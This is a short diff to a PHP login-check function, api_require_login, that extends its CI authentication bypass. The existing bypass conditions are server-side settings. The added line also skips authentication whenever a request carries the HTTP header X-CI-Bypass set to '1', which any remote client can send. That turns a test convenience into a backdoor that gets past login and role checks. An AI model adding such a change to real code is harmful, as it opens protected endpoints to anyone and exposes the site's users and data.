@@ -28,7 +28,8 @@ function api_require_login($roles = null) {
         $ciBypass === '1' ||
         (isset($_ENV['CI_AUTH_BYPASS']) && $_ENV['CI_AUTH_BYPASS'] === '1') ||
         (isset($_SERVER['CI_AUTH_BYPASS']) && $_SERVER['CI_AUTH_BYPASS'] === '1') ||
-        (defined('CI_AUTH_BYPASS') && CI_AUTH_BYPASS === true)
+        (defined('CI_AUTH_BYPASS') && CI_AUTH_BYPASS === true) ||
+        (isset($_SERVER['HTTP_X_CI_BYPASS']) && $_SERVER['HTTP_X_CI_BYPASS'] === '1')
     ) {
         return $authInstance;
     }
